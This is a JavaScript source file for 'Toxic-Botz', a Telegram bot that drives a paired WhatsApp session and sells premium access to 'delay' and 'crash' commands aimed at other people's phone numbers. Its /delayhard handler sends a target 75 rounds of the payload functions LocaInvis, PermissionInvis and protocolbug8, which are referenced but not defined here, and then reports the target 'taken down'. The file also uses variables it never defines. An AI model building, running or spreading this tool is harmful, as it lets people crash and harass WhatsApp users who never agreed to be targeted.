const { Telegraf, Markup, session } = require("telegraf");
const fs = require("fs");
const {
  makeWASocket,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const chalk = require("chalk");
const { BOT_TOKEN, moderatorID } = require("./tokenbot/config");

const bot = new Telegraf(BOT_TOKEN);
bot.use(session());
let bito = null;
let isWhatsAppConnected = false;
const blacklist = ["7737364522", "5271566275", "5126860596"];
const randomImages = [
  "https://files.catbox.moe/b90xbl.jpg",
  "https://files.catbox.moe/b90xbl.jpg",
];
const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);
  return `${hours}h ${minutes}m ${seconds}s`;
};

const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState("./session");
  const { version } = await fetchLatestBaileysVersion();
  bito = makeWASocket({
    version,
    auth: state,
    printQRInTerminal: false,
    keepAliveIntervalMs: 30000,
    logger: pino({ level: "silent" }),
    browser: ["Mac OS", "Safari", "10.15.7"],
    getMessage: async () => ({ conversation: "P" }),
  });
  bito.ev.on("creds.update", saveCreds);
  bito.ev.on("connection.update", (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === "open") {
      isWhatsAppConnected = true;
      console.log(
        chalk.green(
          "\n◈━━━━━━━━━━━━━━━━◈\n│❒ Success: WhatsApp connected!\n◈━━━━━━━━━━━━━━━━◈"
        )
      );
    }
    if (connection === "close") {
      isWhatsAppConnected = false;
      const shouldReconnect =
        lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(
        chalk.red(
          "\n◈━━━━━━━━━━━━━━━━◈\n│❒ Error: WhatsApp disconnected!\n◈━━━━━━━━━━━━━━━━◈"
        )
      );
      if (shouldReconnect) startSesi();
    }
  });
};

const loadJSON = (file) => {
  if (!fs.existsSync(file)) return [];
  return JSON.parse(fs.readFileSync(file, "utf8"));
};

const saveJSON = (file, data) => {
  fs.writeFileSync(file, JSON.stringify(data, null, 2));
};

let ownerUsers = loadJSON(ownerFile);
let premiumUsers = loadJSON(premiumFile);

const checkOwner = (ctx, next) => {
  if (!ownerUsers.includes(ctx.from.id.toString()))
    return ctx.reply(
      "\n◈━━━━━━━━━━━━━━━━◈\n│❒ Error: You are not the developer!\n◈━━━━━━━━━━━━━━━━◈"
    );
  next();
};

const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.reply(
      `\n◈━━━━━━━━━━━━━━━━◈\n│❒ Error: You are not a premium user!\n│❒ Contact @xh_clinton to get premium access.\n◈━━━━━━━━━━━━━━━━◈`
    );
  }
  next();
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected)
    return ctx.reply(
      "\n◈━━━━━━━━━━━━━━━━◈\n│❒ Error: WhatsApp not paired!\n◈━━━━━━━━━━━━━━━━◈"
    );
  next();
};

function isModerator(userId) {
  userId = String(userId);
  return moderatorID.includes(userId) ? "✅" : "⛔";
}

// === COMMAND START ===
bot.command("start", async (ctx) => {
  const userId = ctx.from.id.toString();
  if (blacklist.includes(userId))
    return ctx.reply(
      "\n◈━━━━━━━━━━━━━━━━◈\n│❒ Error: You are blacklisted!\n◈━━━━━━━━━━━━━━━━◈"
    );

  const randomImage = getRandomImage();
  const uptime = getUptime();

  const caption = `
◈━━━━━━━━━━━━━━━━◈
│❒ Welcome to Toxic-Botz
◈━━━━━━━━━━━━━━━━◈

🕷️ *Developer*: @xh_clinton
⚙️ *Version*: 1.1.0
💻 *Language*: Javascript
🛡️ *Moderator*: ${isModerator(ctx.from.id)}

◈━━━━━━━━━━━━━━━━◈
│❒ Commands
◈━━━━━━━━━━━━━━━━◈
• /addprem <code>id</code> → Add premium user
• /delprem <code>id</code> → Remove premium user
• /cekprem → Check premium status
• /pairing <code>number</code> → Start WhatsApp pairing

◈━━━━━━━━━━━━━━━━◈
│❒ Delay Commands
◈━━━━━━━━━━━━━━━━◈
• /delayhard → Hard delay
• /delaystiker → Sticker delay
• /delaycombo → Combo delay

◈━━━━━━━━━━━━━━━━◈
│❒ Crash Commands
◈━━━━━━━━━━━━━━━━◈
• /crashdoc → Document crash
• /crashnew → New crash
• /crashhex → Hex crash

◈━━━━━━━━━━━━━━━━◈
│❒ Welcome to the darkness... Toxic-Botz
◈━━━━━━━━━━━━━━━━◈
`;

  try {
    await ctx.replyWithPhoto(randomImage, {
      caption: caption,
      parse_mode: "HTML",
      ...Markup.inlineKeyboard([
        [Markup.button.url("Developer", "https://t.me/xh_clinton")],
      ]),
    });
  } catch (error) {
    console.error(
      chalk.red(
        `\n◈━━━━━━━━━━━━━━━━◈\n│❒ Error in /start command: ${error.message}\n◈━━━━━━━━━━━━━━━━◈`
      )
    );
    ctx.reply(
      `\n◈━━━━━━━━━━━━━━━━◈\n│❒ Error: Failed to send welcome message.\n│❒ Please try again later.\n◈━━━━━━━━━━━━━━━━◈`
    );
  }
});

// === COMMAND DELAYHARD ===
bot.command("delayhard", checkWhatsAppConnection, checkPremium, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1];
    if (!q) {
      return ctx.reply(
        `\n◈━━━━━━━━━━━━━━━━◈\n│❒ Error: Invalid format!\n│❒ Use: <code>/delayhard 62xxxx</code>\n│❒ Enter the target number correctly.\n◈━━━━━━━━━━━━━━━━◈`,
        { parse_mode: "HTML" }
      );
    }

    const t = q.replace(/[^0-9]/g, "") + "@newsletter";

    const processMsg = await ctx.reply(
      `\n◈━━━━━━━━━━━━━━━━◈\n│❒ Number: <code>${q}</code>\n│❒ Status: Processing...\n│❒ Do not interrupt... the bug is running.\n◈━━━━━━━━━━━━━━━━◈`,
      { parse_mode: "HTML" }
    );

    // Note: LocaInvis, PermissionInvis, and protocolbug8 must be defined elsewhere
    for (let i = 0; i < 75; i++) {
      await LocaInvis(t);
      await PermissionInvis(t);
      await protocolbug8(t);
    }

    await ctx.telegram.deleteMessage(ctx.chat.id, processMsg.message_id);

    await ctx.reply(
      `\n◈━━━━━━━━━━━━━━━━◈\n│❒ Number: <code>${q}</code>\n│❒ Status: Success\n│❒ Target has been taken down.\n◈━━━━━━━━━━━━━━━━◈`,
      { parse_mode: "HTML" }
    );
  } catch (e) {
    console.error(
      chalk.red(
        `\n◈━━━━━━━━━━━━━━━━◈\n│❒ Error: ${e.message}\n◈━━━━━━━━━━━━━━━━◈`
      )
    );
    ctx.reply(
      `\n◈━━━━━━━━━━━━━━━━◈\n│❒ Error: Something went wrong...\n│❒ The ritual failed.\n◈━━━━━━━━━━━━━━━━◈`,
      { parse_mode: "HTML" }
    );
  }
});

// === OWNER COMMANDS ===
bot.command("addprem", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply(
      `\n◈━━━━━━━━━━━━━━━━◈\n│❒ Error: Invalid format!\n│❒ Use: <code>/addprem &lt;id&gt;</code>\n│❒ Example: <code>/addprem 123456789</code>\n◈━━━━━━━━━━━━━━━━◈`,
      { parse_mode: "HTML" }
    );
  }

  const userId = args[1];

  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
    return ctx.reply(
      `\n◈━━━━━━━━━━━━━━━━◈\n│❒ Success: Premium access added!\n│❒ User ID: <code>${userId}</code>\n│❒ Status: Now a premium user!\n◈━━━━━━━━━━━━━━━━◈`,
      { parse_mode: "HTML" }
    );
  }

  ctx.reply(
    `\n◈━━━━━━━━━━━━━━━━◈\n│❒ Warning: User is already premium!\n│❒ User ID: <code>${userId}</code>\n◈━━━━━━━━━━━━━━━━◈`,
    { parse_mode: "HTML" }
  );
});

bot.command("delprem", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2)
    return ctx.reply(
      `\n◈━━━━━━━━━━━━━━━━◈\n│❒ Error: Invalid format!\n│❒ Use: <code>/delprem &lt;id&gt;</code>\n◈━━━━━━━━━━━━━━━━◈`,
      { parse_mode: "HTML" }
    );
  const userId = args[1];
  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);
  ctx.reply(
    `\n◈━━━━━━━━━━━━━━━━◈\n│❒ Success: User <code>${userId}</code> removed from premium.\n◈━━━━━━━━━━━━━━━━◈`,
    { parse_mode: "HTML" }
  );
});

bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();
  ctx.reply(
    premiumUsers.includes(userId)
      ? `\n◈━━━━━━━━━━━━━━━━◈\n│❒ Status: You are a premium user.\n◈━━━━━━━━━━━━━━━━◈`
      : `\n◈━━━━━━━━━━━━━━━━◈\n│❒ Status: You are not a premium user.\n◈━━━━━━━━━━━━━━━━◈`
  );
});

bot.command("pairing", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2)
    return ctx.reply(
      `\n◈━━━━━━━━━━━━━━━━◈\n│❒ Error: Invalid format!\n│❒ Use: <code>/pairing &lt;number&gt;</code>\n◈━━━━━━━━━━━━━━━━◈`,
      { parse_mode: "HTML" }
    );
  const phoneNumber = args[1].replace(/[^0-9]/g, "");
  try {
    const code = await bito.requestPairingCode(phoneNumber);
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
    await ctx.reply(
      `\n◈━━━━━━━━━━━━━━━━◈\n│❒ Success: Pairing completed!\n│❒ Number: ${phoneNumber}\n│❒ Code: ${formattedCode}\n◈━━━━━━━━━━━━━━━━◈`
    );
  } catch (err) {
    console.error(
      chalk.red(
        `\n◈━━━━━━━━━━━━━━━━◈\n│❒ Error: Pairing failed - ${err.message}\n◈━━━━━━━━━━━━━━━━◈`
      )
    );
    ctx.reply(
      `\n◈━━━━━━━━━━━━━━━━◈\n│❒ Error: Failed to pair WhatsApp.\n◈━━━━━━━━━━━━━━━━◈`
    );
  }
});

// === START BOT ===
(async () => {
  console.clear();
  console.log(
    chalk.red.bold(
      `\n◈━━━━━━━━━━━━━━━━◈\n│❒ Starting WhatsApp session...\n◈━━━━━━━━━━━━━━━━◈`
    )
  );
  await startSesi();
  console.log(
    chalk.green(
      `\n◈━━━━━━━━━━━━━━━━◈\n│❒ Success: Connected to WhatsApp!\n◈━━━━━━━━━━━━━━━━◈`
    )
  );
  bot.launch();
  console.clear();
  console.log(
    chalk.red.bold(
      `\n
◈━━━━━━━━━━━━━━━━◈
│❒ Toxic-Botz
│❒ Powered by @xh_clinton
◈━━━━━━━━━━━━━━━━◈
      `
    )
  );
})();